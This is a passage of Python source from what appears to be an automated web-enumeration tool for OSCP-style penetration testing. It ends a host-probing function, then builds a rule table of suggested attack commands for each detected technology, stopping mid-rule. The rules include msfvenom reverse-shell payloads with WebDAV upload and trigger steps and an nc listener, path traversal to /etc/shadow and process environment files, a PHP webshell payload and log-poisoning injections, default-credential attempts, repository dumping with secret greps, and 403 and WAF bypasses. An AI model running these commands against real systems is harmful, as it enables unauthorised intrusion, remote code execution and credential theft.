    tech_blob = " ".join(t.lower() for t in pr.tech)
    if "wordpress" in tech_blob or "wp-content" in tech_blob:
        pr.wp_users = probe_wordpress_users_api(host, port, is_ssl)

    # CMS version-disclosing files (CHANGELOG, manifest, readme)
    pr.cms_version_files = probe_cms_version_files(host, port, is_ssl, pr.tech)

    # IIS 8.3 shortname vulnerability — check whenever IIS/ASP is detected OR
    # the OS is Windows (any web server on Windows can be IIS under the hood)
    from .state import OS_GUESS as _os_guess_ref
    _os_str = str(_os_guess_ref.get("os", "")).lower()
    _is_win_target = "windows" in _os_str
    if any(x in tech_blob for x in ("iis", "microsoft-iis", "asp")) or _is_win_target:
        pr.iis_shortname_vuln = check_iis_shortname(host, port, is_ssl)

    # Backup extension check on discovered files
    pr.backup_files_found = check_backup_extensions(host, port, is_ssl, pr.probes)

    # Directory listing detection on discovered directories
    pr.dir_listings = check_directory_listing(host, port, is_ssl, pr.probes)

    # Error page info/path disclosure
    pr.error_disclosures = check_error_disclosure(host, port, is_ssl)

    # Basic LFI indicators on parameterized paths
    lfi_hits = check_lfi_indicators(host, port, is_ssl, pr.probes)
    for lfi in lfi_hits:
        if lfi not in pr.error_disclosures:
            pr.error_disclosures.append(lfi)

    # Enrich error disclosures with cross-reference analysis (proxy leaks, stack traces, etc.)
    pr.error_disclosure_analysis = analyze_error_disclosures(pr.error_disclosures, pr.tech)

    # Quick feroxbuster scan — always runs on every web port (skip with --no-ferox-quick)
    # Uses raft-medium in non-recursive mode for a very fast first look.
    if RUNTIME_OPTS.get("do_ferox_quick", True):
        pr.ferox_quick_results = run_ferox_quick(
            pr.url, pr.tech,
            timeout=min(60, int(RUNTIME_OPTS.get("gobuster_timeout", 90) or 90))
        )

    # ── API detection + targeted feroxbuster scan ─────────────────────────────
    # Runs automatically when API indicators are present in the probe results.
    # Capped at 60 seconds so it doesn't slow down sequential deep checks.
    _api_info = detect_api_type(host, port, is_ssl, pr.probes, body_t, pr.tech, pr.whatweb_out)
    if _api_info:
        _api_fw   = _api_info.get("framework", "REST API")
        _api_desc = _api_info.get("description", "")
        _api_path = _api_info.get("path", "/api/")
        _spec_url = _api_info.get("spec_url", "")
        # Tag it for reporting
        _api_tag  = f"API:{_api_fw}" if _api_fw else "API:detected"
        if not any("API:" in t or "api" in t.lower() for t in pr.tech):
            pr.tech.append(_api_tag)
        if _api_desc and not any(_api_desc in s.get("value","") for s in pr.js_secrets):
            pr.js_secrets.append({"type": "API Framework", "value": _api_desc, "source": _api_path})
        if _spec_url:
            pr.js_secrets.append({"type": "OpenAPI Spec", "value": f"Spec at {_spec_url} → import into Burp/Postman", "source": _spec_url})
        # Run targeted API feroxbuster scan for up to 60 seconds
        if not shutdown_flag.is_set() and shutil.which("feroxbuster"):
            with print_lock:
                print(f"  {C.CYAN}> API detected ({_api_fw}) — running targeted feroxbuster on {_api_path} (60s)...{C.END}",
                      end="", flush=True)
            _api_ferox_results = run_api_ferox(pr.url, _api_path, timeout=60)
            with print_lock:
                print(f" {C.GREEN}{len([r for r in _api_ferox_results if r['status'] not in ('0','')])}"
                      f" hits{C.END}")
            # Merge into ferox_quick_results so they show in the port block
            for _ar in _api_ferox_results:
                if _ar.get("status") not in ("0", ""):
                    pr.ferox_quick_results.append(_ar)

    # Gobuster dir scan (DirBuster-equiv, OSCP-allowed; skip with --no-gobuster)
    if RUNTIME_OPTS.get("do_gobuster", True) and shutil.which("gobuster"):
        exts = "php,txt,html,bak,old"
        if any(x in tech_blob for x in ("iis", "aspnet", "asp.net")):
            exts = "aspx,asp,ashx,asmx,txt,bak,config"
        elif any(x in tech_blob for x in ("java", "tomcat", "jsp")):
            exts = "jsp,do,action,txt,bak"
        pr.gobuster_results = run_gobuster_dir(pr.url, extensions=exts, timeout=min(60, int(RUNTIME_OPTS.get("gobuster_timeout", 90) or 90)))

        # Also scan robots.txt Disallow paths — OSCP methodology: enumerate what
        # the server tells you exists. These are often the real attack surface.
        if pr.robots.present and pr.robots.snippet and pr.url:
            _robots_extra = []
            for _rl in pr.robots.snippet.splitlines():
                _rl = _rl.strip()
                if _rl.lower().startswith("disallow:"):
                    _rpath = _rl.split(":", 1)[1].strip().rstrip("/")
                    if _rpath and _rpath != "/" and len(_rpath) > 1:
                        _robots_extra.append(_rpath)
            # Scan up to 4 unique robots.txt base dirs with gobuster
            _scanned_bases = set()
            for _rp in _robots_extra[:6]:
                # Use the first directory component as the scan base
                _base = "/" + _rp.strip("/").split("/")[0] + "/"
                if _base in _scanned_bases or _base == "/":
                    continue
                _scanned_bases.add(_base)
                _rp_url = pr.url.rstrip("/") + _base
                try:
                    _rp_results = run_gobuster_dir(_rp_url, extensions=exts,
                                                    timeout=min(60, RUNTIME_OPTS.get("gobuster_timeout", 90)))
                    if _rp_results:
                        pr.gobuster_results.extend(_rp_results)
                except Exception:
                    pass
                if len(_scanned_bases) >= 4:
                    break

    # ── New OSCP-compliant active checks ─────────────────────────────────────
    _vhost_arg = vhost if vhost else None

    # Host header injection — password-reset poisoning / SSRF-via-Host
    pr.host_header_injection = check_host_header_injection(
        host, port, is_ssl, vhost=_vhost_arg)

    # Default credentials — Tomcat, Jenkins, Grafana, phpMyAdmin, Webmin, Kibana
    pr.default_creds_found = check_default_credentials(
        host, port, is_ssl, pr.tech, vhost=_vhost_arg)

    # Active 403 bypass probing — header overrides + path tricks
    _paths_403 = [p.path for p in pr.probes if p.status == "403" and p.path]
    if _paths_403:
        pr.bypass_403_found = check_403_bypass_active(
            host, port, is_ssl, _paths_403, vhost=_vhost_arg)

    # wpscan passive enum (OSCP-allowed) — only when WordPress detected
    if ("wordpress" in tech_blob or "wp-content" in tech_blob) and shutil.which("wpscan"):
        pr.wpscan_out = run_wpscan(pr.url, timeout=120)

    # ── Source-code & dependency intelligence (source_recon) ─────────────────
    # Probe for exposed package manifests, version files, .git, CI/CD artefacts.
    # Only runs when the target is actually a web app (has a body / tech detected).
    _sr = _get_source_recon()
    if _sr and not shutdown_flag.is_set():
        try:
            _already_probed = {p.path for p in pr.probes if p.status == "200"}
            _sr_result = _sr.probe_source_manifests(
                host          = _connect_host,
                port          = port,
                use_ssl       = is_ssl,
                body_html     = body_t,
                tech_list     = pr.tech,
                vhost         = vhost,
                already_200   = _already_probed,
                workers       = 18,
            )
            # Merge findings into PortResult
            pr.software_versions = [
                {
                    "name":      s.name,
                    "version":   s.version,
                    "source":    s.source,
                    "category":  s.category,
                    "is_pinned": s.is_pinned,
                }
                for s in _sr_result.software
            ]
            pr.github_repos  = _sr_result.github_repos
            pr.git_exposure  = {
                "remote_url":      _sr_result.git.remote_url,
                "branch":          _sr_result.git.branch,
                "last_commit_msg": _sr_result.git.last_commit_msg,
                "exposed":         str(_sr_result.git.exposed),
            } if _sr_result.git.exposed else {}
            pr.ci_files = _sr_result.ci_files

            # Run searchsploit against found software versions
            if _sr_result.software:
                _sp_hits = _sr.run_searchsploit_for_software(_sr_result.software)
                pr.searchsploit_software = _sp_hits
                # Also merge into existing searchsploit_results for the report
                for term, lines in _sp_hits.items():
                    for ln in lines:
                        entry = f"[{term}] {ln}"
                        if entry not in pr.searchsploit_results:
                            pr.searchsploit_results.append(entry)
        except Exception as _sre:
            pass   # source_recon is best-effort; never break the main scan

    # ─────────────────────────────────────────────────────────────────────────
    return pr


# --------------------------- Output Formatting -----------------

# --------------------------- HTTP suggestion engine ---------------------------

_DEFAULT_RULES = [
  # ============================================================================
  # LINUX-BASED WEB SERVERS
  # ============================================================================
  {
    "name": "Linux + Apache/Nginx (PHP likely)",
    "tags_any": ["apache", "nginx"],
    "not_any": ["iis", "aspnet", "sharepoint"],
    "commands": [
      "# Linux web server detected - PHP/common extensions",
      "feroxbuster -u '{url}' -x php,txt,bak,html,old,zip,log,json,xml,env,conf,ini --no-recursion -C 404,403 -t 40 -q -w {wl_common}",
      "feroxbuster -u '{url}' -x php,txt,bak,html,old,zip,log,json,xml,env,conf --extract-links -C 404,403 -t 50 -q -w {wl_medium}",
      "feroxbuster -u '{url}' -x php,txt,bak,html,old,zip,log,json,xml,env,conf --extract-links -C 404 -t 50 -q -w {wl_large}",
      "feroxbuster -u '{url}' -x php,txt,bak,html,old,zip,log,json,xml,env --extract-links -C 404 -t 50 -q -w {wl_combined}",
      "feroxbuster -u '{url}' -x php,txt,bak,html,old,zip,log,json --extract-links -C 404 -t 50 -q -w {wl_combined_lower}",
      "gobuster dir -u '{url}' -x php,txt,bak,env,log,json,xml,old -t 50 -w {wl_common}",
      "curl -sS '{url}' -I | grep -iE 'server|x-powered|php'",
      "cewl '{url}' -m 4 --with-numbers -w /tmp/cewl_wordlist.txt && feroxbuster -u '{url}' -w /tmp/cewl_wordlist.txt -t 30 -C 404",
      "# === NUCLEAR: raft-large-words covers both dirs AND file stems ===",
      "feroxbuster -u '{url}' -x php,html,txt,bak,old,env,log,json,xml --extract-links --force-recursion -C 404 -t 50 -q -w {wl_large_words}",
    ]
  },
  {
    "name": "PHP detected",
    "tags_all": ["php"],
    "commands": [
      "# PHP application - check for common vulns",
      "feroxbuster -u '{url}' -x php,phtml,inc,php.bak,php~,php.old,phps,php5,php7 --extract-links -C 404 -t 50 -w {wl_medium}",
      "curl -sS '{url}phpinfo.php' | head -50",
      "curl -sS '{url}info.php' | head -50",
      "curl -sS '{url}' -H 'X-Forwarded-For: 127.0.0.1' | head  # check for IP-based access",
    ]
  },
  # ============================================================================
  # WINDOWS-BASED WEB SERVERS (IIS / ASP.NET)
  # ============================================================================
  {
    "name": "Windows IIS / ASP.NET (comprehensive)",
    "tags_any": ["iis", "aspnet"],
    "commands": [
      "# Windows IIS detected - use IIS-specific wordlist and extensions",
      "feroxbuster -u '{url}' -x aspx,asp,ashx,asmx,axd,svc,config,txt,bak,old,xml,json --no-recursion -C 404 -t 40 -q -w {wl_common}",
      "feroxbuster -u '{url}' -x aspx,asp,ashx,asmx,axd,svc,config,txt,bak,old,xml,json --extract-links -C 404 -t 50 -q -w {wl_medium}",
      "feroxbuster -u '{url}' -x aspx,asp,ashx,asmx,axd,svc,config,txt,bak,old,xml --extract-links -C 404 -t 50 -q -w {wl_large}",
      "feroxbuster -u '{url}' -x aspx,asp,ashx,asmx,config,txt,bak,old,xml --extract-links -C 404 -t 50 -q -w {wl_combined}",
      "feroxbuster -u '{url}' -x aspx,asp,ashx,config,txt,bak,old --extract-links -C 404 -t 50 -q -w {wl_combined_lower}",
      "gobuster dir -u '{url}' -x aspx,asp,ashx,asmx,axd,config,txt,bak -t 50 -w {wl_iis}",
      "curl -sS '{url}web.config' | head -100  # sensitive config",
      "curl -sS '{url}trace.axd' -I  # ASP.NET trace",
      "curl -sS '{url}elmah.axd' -I  # error logging",
      "# IIS 8.3 shortname scanner:",
      "iis-shortname-scanner {url}  # pip3 install iis-shortname-scanner",
      "java -jar iis_shortname_scanner.jar 2 20 {url}  # alt: Java version",
    ]
  },
  {
    "name": "SharePoint enumeration",
    "tags_all": ["sharepoint"],
    "commands": [
      "# SharePoint detected",
      "curl -sSikL '{url}_layouts/15/viewlsts.aspx'  # list all lists",
      "curl -sSikL '{url}_vti_bin/shtml.dll/_vti_rpc'",
      "curl -sSikL '{url}_api/web/lists' -H 'Accept: application/json'",
      "feroxbuster -u '{url}' -x aspx,ashx --extract-links --dont-scan '*/_layouts/*' -t 30 -w {wl_sharepoint}"
    ]
  },
  # ============================================================================
  # WORDPRESS
  # ============================================================================
  {
    "name": "WordPress (comprehensive OSCP-safe enum)",
    "tags_all": ["wordpress"],
    "commands": [
      "# WordPress detected - manual enumeration (wpscan allowed but be careful)",
      "curl -sS '{url}wp-json/wp/v2/users?per_page=100' | jq -r '.[].slug' 2>/dev/null  # user enum",
      "curl -sS '{url}?author=1' -I | grep -i location  # author enum",
      "curl -sS '{url}?author=2' -I | grep -i location",
      "curl -sS '{url}xmlrpc.php' -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'",
      "curl -sS '{url}wp-json/' | head -50  # REST API info",
      "curl -sS '{url}readme.html' | grep -i version  # WP version",
      "curl -sS '{url}wp-includes/version.php' 2>/dev/null || true",
      "feroxbuster -u '{url}wp-content/plugins/' --extract-links -C 404 -t 30 -w {wl_wp_plugins}",
      "feroxbuster -u '{url}wp-content/themes/' --extract-links -C 404 -t 30 -w {wl_wp_themes}",
      "feroxbuster -u '{url}' -x php,txt,bak --extract-links -t 30 -w {wl_common}",
      "wpscan --url '{url}' -e ap,at,u --plugins-detection passive  # passive plugin/theme/user enum",
    ]
  },
  # ============================================================================
  # DRUPAL
  # ============================================================================
  {
    "name": "Drupal (manual enumeration)",
    "tags_all": ["drupal"],
    "commands": [
      "# Drupal detected - check version and paths",
      "curl -sS '{url}CHANGELOG.txt' | head -20  # Drupal version",
      "curl -sS '{url}core/CHANGELOG.txt' | head -20  # Drupal 8+ version",
      "curl -sS '{url}INSTALL.txt' | head -20",
      "curl -sS '{url}user/login' | grep -i drupal",
      "curl -sS '{url}node/1' -I",
      "curl -sS '{url}admin/content' -I",
      "feroxbuster -u '{url}' -x php,txt,module,inc --extract-links -C 404 -t 30 -w {wl_drupal}",
      "feroxbuster -u '{url}sites/default/files/' -x txt,pdf,zip -t 30 -w {wl_common}",
      "# Drupalgeddon2 (CVE-2018-7600) check for Drupal < 7.58 / 8.x < 8.3.9",
    ]
  },
  # ============================================================================
  # JOOMLA
  # ============================================================================
  {
    "name": "Joomla (manual enumeration)",
    "tags_all": ["joomla"],
    "commands": [
      "# Joomla detected",
      "curl -sS '{url}administrator/manifests/files/joomla.xml' | grep -i version",
      "curl -sS '{url}language/en-GB/en-GB.xml' | grep -i version",
      "curl -sS '{url}README.txt' | head -20",
      "curl -sS '{url}administrator/' -I",
      "feroxbuster -u '{url}' -x php,txt,bak --extract-links -C 404 -t 30 -w {wl_joomla}",
      "feroxbuster -u '{url}administrator/' -x php,txt --extract-links -t 30 -w {wl_common}"
    ]
  },
  # ============================================================================
  # JAVA / TOMCAT
  # ============================================================================
  {
    "name": "Java / Tomcat / JBoss",
    "tags_any": ["java"],
    "commands": [
      "# Java web application detected",
      "curl -sSikL '{url}manager/html' -u admin:admin  # default creds",
      "curl -sSikL '{url}manager/html' -u tomcat:tomcat",
      "curl -sSikL '{url}manager/html' -u tomcat:s3cret",
      "curl -sSikL '{url}host-manager/html' -I",
      "curl -sSikL '{url}invoker/JMXInvokerServlet' -I  # JBoss",
      "curl -sSikL '{url}jmx-console/' -I  # JBoss",
      "curl -sSikL '{url}web-console/' -I  # JBoss",
      "feroxbuster -u '{url}' -x jsp,do,action,jsf,faces --extract-links -C 404 -t 30 -w {wl_tomcat}",
      "feroxbuster -u '{url}' -x jsp,do,action --extract-links -t 30 -w {wl_common}"
    ]
  },
  # ============================================================================
  # NODE.JS / EXPRESS
  # ============================================================================
  {
    "name": "Node.js / Express",
    "tags_all": ["node"],
    "commands": [
      "# Node.js application detected",
      "curl -sS '{url}package.json' | head -50",
      "curl -sS '{url}api/' | head -50",
      "curl -sS '{url}api/v1/' | head -50",
      "curl -sS '{url}swagger.json'",
      "curl -sS '{url}api-docs/'",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
      "feroxbuster -u '{url}' -x js,json,map --extract-links -C 404 -t 30 -w {wl_api}",
      "feroxbuster -u '{url}api/' --extract-links -t 30 -w {wl_common}"
    ]
  },
  # ============================================================================
  # SPECIAL SERVICES
  # ============================================================================
  {
    "name": "WebDAV",
    "tags_all": ["webdav"],
    "commands": [
      "# WebDAV enabled - check for write access",
      "curl -sS -X OPTIONS '{url}' -I | grep -i allow  # check methods",
      "curl -sS -X PROPFIND '{url}' -H 'Depth: 1'  # list files",
      "davtest -url '{url}'  # automated upload capability test",
      "cadaver '{url}'  # interactive WebDAV client (try: ls, put shell.aspx)",
      "# --- Authenticated upload ---",
      "curl -T 'shell.aspx' '{url}' -u USER:PASS  # upload with credentials",
      "curl -X MOVE --header 'Destination:{url}shell.aspx' '{url}shell.txt'  # rename after upload",
      "# --- Generate shell payload ---",
      "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f aspx -o shell.aspx",
      "msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f asp > shell.asp",
      "# --- After upload, trigger shell ---",
      "curl '{url}shell.aspx'  # trigger the uploaded shell",
      "nc -nvlp 443  # catch the connection",
    ]
  },
  {
    "name": "Jenkins",
    "tags_all": ["jenkins"],
    "commands": [
      "# Jenkins detected - check for unauthenticated access",
      "curl -sS '{url}api/json?pretty=true' | head -100",
      "curl -sS '{url}script' -I  # Groovy script console (RCE if accessible!)",
      "curl -sS '{url}asynchPeople/' | head -50  # user enumeration",
      "curl -sS '{url}credentials/' -I",
      "curl -sS '{url}configureSecurity/' -I",
    ]
  },
  {
    "name": "Git repository exposed",
    "tags_all": ["git_exposed"],
    "commands": [
      "# .git directory detected! Check if accessible or blocked:",
      "curl -sS '{url}.git/HEAD'  # Should show: ref: refs/heads/main",
      "curl -sS '{url}.git/config'  # Repository config with remote URLs",
      "curl -sS '{url}.git/logs/HEAD'  # Commit history with emails",
      "curl -sS '{url}.git/index'  # Binary index - lists all files",
      "",
      "# If 403 Forbidden, try these bypasses:",
      "curl -sS '{url}.git/HEAD' -H 'X-Original-URL: /.git/HEAD'",
      "curl -sS '{url}/.git/HEAD' -H 'X-Forwarded-For: 127.0.0.1'",
      "curl -sS '{url}%2e%67%69%74/HEAD'  # URL-encoded .git",
      "curl -sS '{url}.git./HEAD'  # Trailing dot bypass",
      "curl -sS '{url}.git/HEAD' --path-as-is",
      "",
      "# If accessible, dump the entire repo:",
      "git-dumper '{url}.git/' ./git-dump",
      "cd git-dump && git log --oneline -50",
      "cd git-dump && git branch -a",
      "cd git-dump && git show  # latest commit",
      "",
      "# Search for secrets in repo:",
      "cd git-dump && git grep -nE '(password|passwd|secret|token|api_key|apikey|private_key|credential|aws_|AKIA)' || true",
      "cd git-dump && git log -p | grep -iE '(password|secret|key|token)' | head -50",
      "trufflehog git file://./git-dump --only-verified 2>/dev/null || true",
    ]
  },
  {
    "name": "SVN repository exposed",
    "tags_all": ["svn_exposed"],
    "commands": [
      "# .svn directory detected! Check accessibility:",
      "curl -sS '{url}.svn/entries'  # SVN < 1.7 format",
      "curl -sS '{url}.svn/wc.db' -o wc.db  # SVN >= 1.7 SQLite DB",
      "",
      "# If 403, try bypasses:",
      "curl -sS '{url}.svn/entries' -H 'X-Forwarded-For: 127.0.0.1'",
      "curl -sS '{url}%2e%73%76%6e/entries'  # URL-encoded",
      "",
      "# Extract from wc.db:",
      "sqlite3 wc.db 'SELECT local_relpath, checksum FROM NODES;'",
      "strings wc.db | grep -E '(password|secret|key|http|user)' | head -30",
      "",
      "# Use dedicated tools:",
      "svn-extractor -u '{url}' -o ./svn-dump",
      "# Or: https://github.com/anantshri/svn-extractor",
    ]
  },
  {
    "name": "Mercurial (.hg) repository exposed",
    "tags_all": ["hg_exposed"],
    "commands": [
      "# .hg directory detected!",
      "curl -sS '{url}.hg/hgrc'  # Mercurial config",
      "curl -sS '{url}.hg/store/00manifest.i'",
      "curl -sS '{url}.hg/dirstate'",
      "",
      "# If accessible, dump the repo:",
      "hg clone '{url}' ./hg-dump",
      "cd hg-dump && hg log -l 50",
      "cd hg-dump && hg grep -r 'all()' '(password|secret|token|key)'",
    ]
  },
  {
    "name": ".env file exposed",
    "tags_all": ["env_exposed"],
    "commands": [
      "# .env file exposed! - CRITICAL CREDENTIALS EXPOSURE",
      "curl -sS '{url}.env' | grep -vE '^#|^$'  # Filter comments/empty",
      "",
      "# Check for variants:",
      "for f in .env .env.local .env.dev .env.prod .env.production .env.staging .env.backup .env.bak .env.old .env.save .env.example .env.sample; do",
      "  echo \"=== $f ===\"",
      "  curl -sS \"{url}$f\" 2>/dev/null | head -20",
      "done",
      "",
      "# Common secrets to grep for:",
      "curl -sS '{url}.env' | grep -iE '(DB_|DATABASE_|MYSQL_|POSTGRES_|MONGO_|REDIS_|AWS_|API_|SECRET_|KEY_|TOKEN_|PASSWORD|PASS=|AUTH)'",
      "",
      "# Laravel specific:",
      "curl -sS '{url}.env' | grep -E '(APP_KEY|DB_PASSWORD|MAIL_PASSWORD|PUSHER_|AWS_)'",
    ]
  },
  {
    "name": "WAF detected - use evasion",
    "tags_all": ["waf"],
    "commands": [
      "# WAF detected - throttle and use random User-Agent",
      "feroxbuster -u '{url}' -x php,txt,bak -t 10 --rate-limit 30 --random-agent -C 403,429 -w {wl_common}",
      "gobuster dir -u '{url}' -x php,txt -t 10 --delay 200ms --random-agent -w {wl_common}"
    ]
  },
  # ============================================================================
  # LFI — LOCAL FILE INCLUSION
  # ============================================================================
  {
    "name": "LFI / Path Traversal",
    "tags_any": ["web"],
    "match_any": ["lfi", "file=", "page=", "path=", "lang=", "include=", "?file", "?page", "?path", "?lang", "?include", "directory traversal", "local file"],
    "commands": [
      "# === LOCAL FILE INCLUSION / PATH TRAVERSAL ===",
      "# Fuzz for LFI parameters:",
      "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 '{url}?file=FUZZ' 2>/dev/null | head -30",
      "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 '{url}?page=FUZZ' 2>/dev/null | head -30",
      "ffuf -u '{url}?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0 -t 30 2>/dev/null | head -20",
      "",
      "# Fuzz for the parameter name itself:",
      "ffuf -u '{url}?FUZZ=/etc/passwd' -w {wl_params} -mc 200 -t 30 2>/dev/null | head -20",
      "",
      "# --- Common LFI bypass techniques ---",
      "# Basic traversal:",
      "curl -sS '{url}?file=../../../etc/passwd'",
      "curl -sS '{url}?page=../../../../etc/passwd'",
      "# URL-encoded:",
      "curl -sS '{url}?file=..%2F..%2F..%2Fetc%2Fpasswd'",
      "curl -sS '{url}?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'",
      "# Double URL-encoded:",
      "curl -sS '{url}?file=%252e%252e%252fetc%252fpasswd'",
      "# Null byte (PHP < 5.3.4):",
      "curl -sS '{url}?file=../../../etc/passwd%00'",
      "curl -sS '{url}?file=../../../etc/passwd%00.jpg'",
      "# Repeated slashes / dots:",
      "curl -sS '{url}?file=....//....//....//etc/passwd'",
      "curl -sS '{url}?file=.?/.?/.?/.?/etc/passwd'",
      "# PHP wrappers:",
      "curl -sS '{url}?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d",
      "curl -sS '{url}?file=php://filter/read=string.rot13/resource=config.php'",
      "curl -sS '{url}?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'",
      "",
      "# --- Common Linux LFI targets ---",
      "curl -sS '{url}?file=../../../etc/passwd'        # users",
      "curl -sS '{url}?file=../../../etc/shadow'        # hashed passwords",
      "curl -sS '{url}?file=../../../etc/hosts'",
      "curl -sS '{url}?file=../../../proc/self/environ' # env vars (credentials!)",
      "curl -sS '{url}?file=../../../var/log/apache2/access.log'  # log poisoning",
      "curl -sS '{url}?file=../../../var/log/auth.log'            # log poisoning via SSH",
      "",
      "# --- Common Windows LFI targets ---",
      "curl -sS '{url}?file=C:/Windows/System32/drivers/etc/hosts'",
      "curl -sS '{url}?file=C:/Windows/win.ini'",
      "curl -sS '{url}?file=C:/xampp/apache/logs/access.log'   # XAMPP log poisoning",
      "curl -sS '{url}?file=C:/xampp/php/php.ini'",
      "curl -sS '{url}?file=C:/Users/Administrator/Desktop/proof.txt'",
      "",
      "# --- Log poisoning (RCE via LFI + log write) ---",
      "# 1. Inject PHP into User-Agent (Apache log):",
      "curl -sS '{url}' -A '<?php system(\\$_GET[\"cmd\"]); ?>'",
      "# 2. Then include the log with cmd parameter:",
      "curl -sS '{url}?file=../../../var/log/apache2/access.log&cmd=id'",
      "# SSH log poisoning — inject via SSH username:",
      "ssh '<?php system(\\$_GET[\"cmd\"]); ?>'@{host}",
      "curl -sS '{url}?file=../../../var/log/auth.log&cmd=id'",
    ]
  },
  # ============================================================================
  # 403 BYPASS TECHNIQUES (always useful reference)
  # ============================================================================
  {
    "name": "403 Bypass Techniques",
    "tags_any": ["web"],
    "match_any": ["403", "forbidden"],
    "commands": [
      "# === 403 BYPASS TECHNIQUES ===",
      "# Header-based bypasses:",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Original-URL: /BLOCKED_PATH'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Rewrite-URL: /BLOCKED_PATH'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Forwarded-For: 127.0.0.1'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Forwarded-Host: localhost'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Custom-IP-Authorization: 127.0.0.1'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Remote-IP: 127.0.0.1'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Client-IP: 127.0.0.1'",
      "curl -sS '{url}BLOCKED_PATH' -H 'X-Host: localhost'",
      "",
      "# Path-based bypasses:",
      "curl -sS '{url}BLOCKED_PATH/'",
      "curl -sS '{url}BLOCKED_PATH/.'",
      "curl -sS '{url}//BLOCKED_PATH'",
      "curl -sS '{url}./BLOCKED_PATH'",
      "curl -sS '{url}BLOCKED_PATH%20'",
      "curl -sS '{url}BLOCKED_PATH%09'",
      "curl -sS '{url}BLOCKED_PATH%00'",
      "curl -sS '{url}BLOCKED_PATH..;/'",
      "curl -sS '{url}BLOCKED_PATH;/'",
      "curl -sS '{url}BLOCKED_PATH/.randomstring'",
      "",
      "# Case manipulation:",
      "curl -sS '{url}BLOCKED_PATH' | curl -sS '{url}blocked_path' | curl -sS '{url}BLOCKED_PATH'",
      "",
      "# HTTP method change:",
      "curl -sS -X POST '{url}BLOCKED_PATH'",
      "curl -sS -X PUT '{url}BLOCKED_PATH'",
      "curl -sS -X TRACE '{url}BLOCKED_PATH'",
      "",
      "# Tool: https://github.com/iamj0ker/bypass-403",
      "bypass-403 '{url}BLOCKED_PATH'",
    ]
  },
  # ============================================================================
  # GENERIC FALLBACK
  # ============================================================================
  {
    "name": "Generic web enumeration (fallback)",
    "tags_any": ["web"],
    "not_any": ["wordpress", "drupal", "joomla", "jenkins", "iis", "aspnet", "sharepoint"],
    "commands": [
      "# Generic web enumeration — common first, then escalate",
      "feroxbuster -u '{url}' -x txt,html,php,bak,old,log,json,xml,env,conf,zip --no-recursion -C 404 -t 40 -q -w {wl_common}",
      "feroxbuster -u '{url}' -x txt,html,php,bak,old,log,json,xml,env,conf,zip --extract-links -C 404 -t 50 -q -w {wl_medium}",
      "feroxbuster -u '{url}' -x txt,html,php,bak,old,log,json,xml,env,conf --extract-links -C 404 -t 50 -q -w {wl_large}",
      "feroxbuster -u '{url}' -x txt,html,php,bak,old,log,json,xml,env --extract-links -C 404 -t 50 -q -w {wl_combined}",
      "feroxbuster -u '{url}' -x txt,html,php,bak,old,log,json,xml --extract-links -C 404 -t 50 -q -w {wl_combined_lower}",
      "gobuster dir -u '{url}' -x txt,php,bak,log,json,xml,env -t 50 -w {wl_common}",
      "curl -sS '{url}' -I | grep -iE 'server|x-powered|x-generator'",
      "cewl '{url}' -m 4 --with-numbers -w /tmp/cewl_wordlist.txt && feroxbuster -u '{url}' -w /tmp/cewl_wordlist.txt -t 30 -C 404",
      "# Parameter fuzzing:",
      "ffuf -u '{url}?FUZZ=1' -w {wl_params} -mc 200 -t 30 -of csv 2>/dev/null | head -20",
      "# === NUCLEAR OPTION (raft-large-words: dirs+files combined ~119K) ===",
      "feroxbuster -u '{url}' -x {exts_csv} --extract-links --force-recursion -C 404 -t 50 -q -w {wl_large_words}",
      "ffuf -u '{url}FUZZ' -w {wl_large_words} -e '.{exts_csv}' -mc 200,201,204,301,302,401,403 -t 50 -ac -of csv -o /tmp/ffuf_nuclear_{port}.csv 2>/dev/null",
    ]
  },
  # ============================================================================
  # SPRING BOOT ACTUATOR
  # ============================================================================
  {
    "name": "Spring Boot Actuator endpoints",
    "tags_any": ["spring_actuator"],
    "commands": [
      "# Spring Boot Actuator detected - check for sensitive exposure",
      "curl -sS '{url}actuator' | jq .  # list all exposed endpoints",
      "curl -sS '{url}actuator/env' | jq .  # environment variables (credentials!)",
      "curl -sS '{url}actuator/configprops' | jq .  # all config properties",
      "curl -sS '{url}actuator/mappings' | jq .  # all URL mappings",
      "curl -sS '{url}actuator/beans' | jq .  # Spring beans",
      "curl -sS '{url}actuator/heapdump' -o heapdump.hprof  # CRITICAL: JVM heap dump",
      "curl -sS '{url}actuator/logfile' | head -100  # application log",
      "curl -sS '{url}actuator/shutdown' -X POST  # shutdown endpoint (if enabled!)",
      "# Heap dump analysis (extract secrets):",
      "strings heapdump.hprof | grep -iE '(password|secret|token|key|aws|jdbc)' | head -50",
      "# Legacy Spring Boot 1.x paths:",
      "curl -sS '{url}env' | jq .  # Spring 1.x env",
      "curl -sS '{url}trace' | jq .  # Spring 1.x request trace",
      "curl -sS '{url}dump' | jq .  # Spring 1.x thread dump",
      "# RCE via /jolokia if exposed:",
      "curl -sS '{url}jolokia/read/java.lang:type=Memory'",
      "curl -sS '{url}jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad'",
    ]
  },
  # ============================================================================
  # GRAPHQL
  # ============================================================================
  {
    "name": "GraphQL API",
    "tags_any": ["graphql"],
    "commands": [
      "# GraphQL endpoint detected",
      "# 1. Introspection query (get full schema):",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' \\",
